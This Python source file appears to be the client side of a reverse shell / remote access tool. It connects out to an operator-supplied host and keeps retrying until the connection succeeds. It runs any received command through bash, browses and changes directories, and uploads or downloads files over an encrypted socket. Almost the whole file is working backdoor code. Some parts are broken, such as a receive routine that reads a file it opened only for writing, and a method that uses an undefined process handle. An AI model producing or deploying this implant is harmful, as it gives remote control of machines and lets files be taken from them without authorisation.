from crypt import ClientPyEncryption
from utils import NO_OUTPUT_SIGNAL
import subprocess
import argparse
import logging
import select
import socket
import json
import time
import os

logging.basicConfig(level=None)

# Constants
SENDING_FILE = b"sendingfile"
GETTING_FILE = b"gettingfile"

def stat_to_dict(stat_obj):
    return {
        'st_mode': stat_obj.st_mode,
        'st_ino': stat_obj.st_ino,
        'st_dev': stat_obj.st_dev,
        'st_nlink': stat_obj.st_nlink,
        'st_uid': stat_obj.st_uid,
        'st_gid': stat_obj.st_gid,
        'st_size': stat_obj.st_size,
        'st_atime': stat_obj.st_atime,
        'st_mtime': stat_obj.st_mtime,
        'st_ctime': stat_obj.st_ctime
    }

def scandir_to_dict(path=None):
    if not path: path = None
    entries = os.scandir(path)
    entries_list = []

    for entry in entries:
        entry_dict = {
            'name': entry.name,
            'path': entry.path,
            'inode': entry.inode(),
            'is_dir': entry.is_dir(),
            'is_file': entry.is_file(),
            'is_symlink': entry.is_symlink(),
        }
        try:
            entry_dict['stat'] = stat_to_dict(entry.stat())
        except Exception as e:
            entry_dict['stat'] = str(e)  # Store any error messages
        entries_list.append(entry_dict)
    entries_list = sorted(entries_list, key=lambda x: x['name'])
    return json.dumps((entries_list)).encode()

class Shell:
    def __init__(self):
        self.end_marker = "END_OF_COMMAND" # TODO: This shouldnt be needed

    def execute_command(self, command):
        completed_process = subprocess.run(["/bin/bash", "-c", command],
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE)

        return completed_process.stdout, completed_process.stderr

    def read_output(self):
        out, err = b"", b""
        while True:
            reads = [self.proc.stdout.fileno(), self.proc.stderr.fileno()]
            ret = select.select(reads, [], [], 0.1)

            for fd in ret[0]:
                if fd == self.proc.stderr.fileno():
                    err += self.proc.stderr.read1()
                if fd == self.proc.stdout.fileno():
                    chunk = self.proc.stdout.read1()
                    out += chunk
                    if self.end_marker.encode() in chunk:
                        return out[:-len(self.end_marker)], err

class NetManager:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        while True:
            try:
                self.socket = self.connect_to_host()
            except ConnectionRefusedError:
                time.sleep(1)
                continue
            break
        self.shell = Shell()
        data = self.socket.recv(1024)
        self.socket.sendall(self.execute_command(data))
        self.crypto = ClientPyEncryption()

    def connect_to_host(self):
        """Establishes a connection to the host."""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        return s

    def receive_file(self, filename):
        """Receives a file from the socket and writes it to the local system."""
        with open(filename, "wb") as f:
            self.send_response(f.read())

    def send_file(self, filename):
        """Reads a file from the local system and sends it through the socket."""
        with open(filename, "rb") as f:
            self.send_response(f.read())

    def change_directory(self, cmd, folder):
        try:
            os.chdir(folder)
            stdout_value = NO_OUTPUT_SIGNAL.encode()
        except FileNotFoundError:
            stdout_value = f"error: {folder} not found".encode()
        finally:
            self.send_response(stdout_value)

    def handle_file_transfers(self, data):
        """Handles file transfers based on the received data."""
        params = data.decode().split(" ")
        if params[0] == "ls":
            if len(params) == 2:
                self.send_response(scandir_to_dict(params[1]))
            elif len(params) == 1:
                self.send_response(scandir_to_dict())
            return True
        if data.decode().split(" ")[0] == "cd":
            cmd = data.decode().split(" ")[0]
            folder = data.decode().split(" ")[1]
            self.change_directory(cmd, folder)
            return True
        if SENDING_FILE in data:
            file = data.decode().split("sendingfile ")[1].strip()
            self.receive_file(file)
            return True
        if GETTING_FILE in data:
            file = data.decode().split("gettingfile ")[1].strip()
            self.send_file(file)
            return True
        return False

    def execute_command(self, data):
        """Executes a command and sends the response back through the socket."""
        stdout_value, stderr_value = self.shell.execute_command(data.decode("utf-8"))
        return f"{stdout_value.decode()}{stderr_value.decode()}".encode()

    def send_response(self, data):
        if len(data) > 0:
            message_length, message = self.crypto.encrypt_message(data, self.crypto.derived_key)
            self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
            self.socket.sendall(message)
        else:
            message_length, message = self.crypto.encrypt_message(NO_OUTPUT_SIGNAL.encode(), self.crypto.derived_key)
            self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
            self.socket.sendall(message)

    def netloop(self):
        self.crypto.parameters = self.crypto.get_params(self.socket)

        while True:
            try:
                self.crypto.derived_key = self.crypto.get_derived_key(self.crypto.parameters, self.socket)
            except ConnectionResetError:
                break
            data = self.socket.recv(1024)
            if not data:
                break
            message = self.crypto.decrypt_message(data, self.crypto.derived_key)
            if self.handle_file_transfers(message):
                continue
            try:
                self.send_response(self.execute_command(message))
            except BrokenPipeError:
                logging.error("Connection closed by the host.")
                break

def main():
    """Main function to parse arguments and start execution."""
    parser = argparse.ArgumentParser()
    parser.add_argument("--host")
    parser.add_argument("--port", type=int)
    parser.add_argument("--test", action="store_true")
    args = parser.parse_args()
    if args.test:
        print("Hello world! Wasd")
        return
    net_manager = NetManager(args.host, args.port)
    net_manager.netloop()


if __name__ == "__main__":
    main()